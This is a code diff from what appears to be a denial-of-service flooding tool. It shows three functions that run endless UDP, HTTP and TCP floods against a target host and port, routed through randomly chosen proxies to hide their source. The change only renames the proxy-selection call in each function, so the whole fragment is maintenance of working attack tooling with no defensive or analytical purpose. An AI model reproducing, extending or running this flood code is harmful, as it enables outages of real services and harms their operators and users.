@@ -39,7 +39,7 @@ def down_it_udp(_ctx: Context) -> None:
     proxy = None
     while True:
         if proxy is None:
-            proxy = _ctx.proxy_manager.random_proxy_from_context()
+            proxy = _ctx.proxy_manager.get_random_proxy()
             if proxy and not proxy.validate():
                 _ctx.proxy_manager.delete_proxy_sync(proxy)
                 proxy = None
@@ -79,7 +79,7 @@ def down_it_http(_ctx: Context) -> None:
     """HTTP flood method."""
     proxy = None
     while True:
-        proxy = _ctx.proxy_manager.random_proxy_from_context()
+        proxy = _ctx.proxy_manager.get_random_proxy()
         try:
             response = http_request(
                 url=_ctx.get_target_url(),
@@ -106,7 +106,7 @@ def down_it_tcp(_ctx: Context) -> None:
     proxy = None
     while True:
         try:
-            proxy = _ctx.proxy_manager.random_proxy_from_context()
+            proxy = _ctx.proxy_manager.get_random_proxy()
             sock = _ctx.sock_manager.create_tcp_socket(proxy)
             sock.connect((_ctx.host_ip, _ctx.port))
             _ctx.Statistic.connect.success += 1
